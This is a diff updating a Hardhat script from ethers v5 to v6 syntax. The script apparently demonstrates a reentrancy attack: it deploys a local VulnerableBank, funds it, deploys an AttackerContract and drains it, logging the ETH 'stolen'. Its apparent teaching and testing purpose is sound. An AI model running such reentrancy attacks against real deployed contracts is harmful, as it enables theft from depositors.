@@ -23,48 +23,64 @@ async function main() {
   console.log("STEP 1: Deploying VulnerableBank...");
   const VulnerableBank = await ethers.getContractFactory("VulnerableBank");
   const bank = await VulnerableBank.deploy();
-  await bank.deployed();
-  console.log(`        ✓ Deployed at: ${bank.address}`);
+  await bank.waitForDeployment();
+  console.log(`        ✓ Deployed at: ${await bank.getAddress()}`);
 
   // ── 2. Innocent users deposit funds ──────────────────────────────────
   console.log("\nSTEP 2: Innocent users deposit into VulnerableBank...");
   const user1 = deployer;
-  await bank.connect(user1).deposit({ value: ethers.utils.parseEther("5.0") });
+  await bank.connect(user1).deposit({ value: ethers.parseEther("5.0") });
   let contractBal = await bank.getContractBalance();
-  console.log(`        ✓ Bank balance: ${ethers.utils.formatEther(contractBal)} ETH`);
+  console.log(
+    `        ✓ Bank balance: ${ethers.formatEther(contractBal)} ETH`
+  );
 
   // ── 3. Deploy attacker contract ───────────────────────────────────────
   console.log("\nSTEP 3: Deploying AttackerContract...");
   const AttackerContract = await ethers.getContractFactory("AttackerContract");
-  const attackerContract = await AttackerContract.connect(attacker).deploy(bank.address);
-  await attackerContract.deployed();
-  console.log(`        ✓ Attacker contract at: ${attackerContract.address}`);
+  const attackerContract = await AttackerContract.connect(attacker).deploy(
+    await bank.getAddress()
+  );
+  await attackerContract.waitForDeployment();
+  console.log(
+    `        ✓ Attacker contract at: ${await attackerContract.getAddress()}`
+  );
 
   // ── 4. Record balances before attack ─────────────────────────────────
-  const bankBefore     = await bank.getContractBalance();
-  const attackerBefore = await attacker.getBalance();
+  const bankBefore = await bank.getContractBalance();
+  const attackerBefore = await ethers.provider.getBalance(attacker.address);
   console.log("\nSTEP 4: Balances BEFORE attack:");
-  console.log(`        Bank balance     : ${ethers.utils.formatEther(bankBefore)} ETH`);
-  console.log(`        Attacker balance : ${ethers.utils.formatEther(attackerBefore)} ETH`);
+  console.log(
+    `        Bank balance     : ${ethers.formatEther(bankBefore)} ETH`
+  );
+  console.log(
+    `        Attacker balance : ${ethers.formatEther(attackerBefore)} ETH`
+  );
 
   // ── 5. Execute the attack ─────────────────────────────────────────────
   console.log("\nSTEP 5: Executing reentrancy attack...");
   console.log("        [Attacker deposits 1 ETH then calls withdraw()]");
-  console.log("        [Each withdraw triggers receive() which calls withdraw() again]");
+  console.log(
+    "        [Each withdraw triggers receive() which calls withdraw() again]"
+  );
   const tx = await attackerContract.connect(attacker).attack({
-    value: ethers.utils.parseEther("1.0"),
+    value: ethers.parseEther("1.0"),
     gasLimit: 3_000_000,
   });
   await tx.wait();
 
   // ── 6. Record balances after attack ──────────────────────────────────
-  const bankAfter     = await bank.getContractBalance();
+  const bankAfter = await bank.getContractBalance();
   const attackerAfter = await attackerContract.getBalance();
   console.log("\nSTEP 6: Balances AFTER attack:");
-  console.log(`        Bank balance          : ${ethers.utils.formatEther(bankAfter)} ETH`);
-  console.log(`        Attacker contract bal : ${ethers.utils.formatEther(attackerAfter)} ETH`);
+  console.log(
+    `        Bank balance          : ${ethers.formatEther(bankAfter)} ETH`
+  );
+  console.log(
+    `        Attacker contract bal : ${ethers.formatEther(attackerAfter)} ETH`
+  );
 
-  const stolen = ethers.utils.formatEther(attackerAfter);
+  const stolen = ethers.formatEther(attackerAfter);
   console.log(`\n⚠️  ATTACK RESULT: ${stolen} ETH stolen from innocent depositors!`);
 
   // ── 7. Summary ────────────────────────────────────────────────────────
